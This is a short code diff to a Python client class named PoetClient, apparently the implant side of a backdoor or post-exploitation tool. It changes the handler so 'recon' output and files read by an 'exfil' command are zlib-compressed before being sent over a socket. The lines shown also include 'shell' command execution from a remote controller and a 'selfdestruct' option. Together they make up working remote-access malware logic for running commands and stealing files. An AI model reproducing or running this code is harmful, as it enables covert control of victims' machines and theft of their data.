@@ -5,6 +5,7 @@ import re
 import sys
 import stat
 import time
+import zlib
 import base64
 import random
 import socket
@@ -112,13 +113,13 @@ class PoetClient(object):
                 elif re.search('^exec ("[^"]+"\ )+$', inp + ' '):
                     s.send(self.execute(inp))
                 elif inp == 'recon':
-                    s.send(self.recon())
+                    s.send(zlib.compress(self.recon()))
                 elif inp.startswith('shell '):
                     s.send(self.cmd_exec(inp[6:]).strip())
                 elif inp.startswith('exfil '):
                     try:
                         with open(os.path.expanduser(inp[6:])) as f:
-                            s.send(f.read())
+                            s.send(zlib.compress(f.read()))
                     except IOError as e:
                         s.send(e.strerror)
                 elif inp == 'selfdestruct':
